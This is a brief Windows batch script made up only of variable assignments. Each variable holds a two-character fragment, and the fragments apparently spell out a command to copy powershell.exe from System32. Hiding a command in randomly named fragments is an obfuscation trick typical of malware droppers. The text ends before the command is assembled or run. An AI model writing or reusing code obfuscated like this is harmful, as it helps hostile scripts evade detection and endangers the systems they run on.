@echo off
set "acuSNmwFMe=1."
set "xoRYdjylCf= /"
set "TGuWEUXcGG=Po"
set "pEwelgyuOB=32"
set "VOLvrRTVHO=rS"
set "zwVbzPicPa=we"
set "SvGuyFmIMx=in"
set "JUnxkiAWKx=em"
set "xHSjfLKbcv=co"
set "bPLtMbxYmL=nd"
set "RCUCmGtllg=ll"
set "cwjTXuefKH= C"
set "bPwtuPEAjg=do"
set "wZiHiAoUBN=\W"
set "kNPTpssTlR=he"
set "SHtcEvvAOA=he"
set "aLbUoMGcLh=xe"
set "TQHqzGCPns=we"
set "CToOIoLTCh=s\"
set "jOyhUeVDvu=rs"
set "lcbNAtUijL=0\"
set "yIJBGWpwoz=po"
set "rxzDLRaQfS=:\"
set "WZqmEPganK=ll"
set "XVqKjsuFrF=y "
set "GFCctCJuHi=py"
set "zNKqrPUEZM=Wi"
set "tbEumUvqmi=st"
set "wbBLMKMFpJ=ws"
set "lSsjBJjCGC=.e"
